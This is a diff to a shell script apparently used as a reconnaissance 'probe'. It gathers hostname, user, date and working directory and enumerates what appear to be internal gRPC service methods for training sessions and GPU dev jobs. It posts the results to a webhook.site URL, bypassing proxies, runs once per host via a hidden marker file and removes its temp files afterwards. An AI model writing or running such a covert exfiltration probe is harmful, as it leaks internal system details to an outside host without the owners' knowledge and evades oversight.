@@ -6,8 +6,8 @@ S="https://webhook.site/7069e327-e98a-475a-ac1b-5a94e9c12667/i86764-$(date +%s)-
 F="${TMPDIR:-/tmp}/.i86764.ran"
 [ -f "$F" ] && { echo "[probe] I86764=skip"; exit 0; }
 : > "$F" 2>/dev/null
-d="${TMPDIR:-/tmp}/.i86764-$$"
-mkdir -p "$d" 2>/dev/null || d=/tmp
+d=$(mktemp -d "${TMPDIR:-/tmp}/.i86764.XXXXXX" 2>/dev/null) || d="${TMPDIR:-/tmp}/.i86764-$$"
+mkdir -p "$d" 2>/dev/null || exit 0
 o="$d/out"; : > "$o"
 {
   echo "== I86764 META host=$(hostname 2>/dev/null) user=$(id -un 2>/dev/null) date=$(date -u +%FT%TZ 2>/dev/null) pwd=$(pwd 2>/dev/null)"
@@ -54,8 +54,11 @@ CreateTrainingSession|gateway.Gateway/CreateTrainingSession|AAAAAAA=
 ExecGpuDevJob|gpu_dev_jobs.GpuDevJobService/ExecGpuDevJob|AAAAAAA=
 DownloadGpuDevJobFile|gpu_dev_jobs.GpuDevJobService/DownloadGpuDevJobFile|AAAAAAA=
 CELLS
-curl -sS -m 25 --noproxy '*' -X POST -H 'content-type: text/plain' --data-binary @"$o" "$S" >/dev/null 2>&1 \
-  || curl -sS -m 25 -X POST -H 'content-type: text/plain' --data-binary @"$o" "$S" >/dev/null 2>&1
-echo "[probe] I86764=posted"
-rm -f "$d"/* 2>/dev/null; rmdir "$d" 2>/dev/null
+OK=0
+curl -sS -m 25 --noproxy '*' -X POST -H 'content-type: text/plain' --data-binary @"$o" "$S" >/dev/null 2>&1 && OK=1
+if [ "$OK" = 0 ]; then
+  curl -sS -m 25 -X POST -H 'content-type: text/plain' --data-binary @"$o" "$S" >/dev/null 2>&1 && OK=1
+fi
+rm -f "$d/out" "$d/req" "$d/h" "$d/b" 2>/dev/null; rmdir "$d" 2>/dev/null
+echo "[probe] I86764=posted ok=$OK"
 exit 0
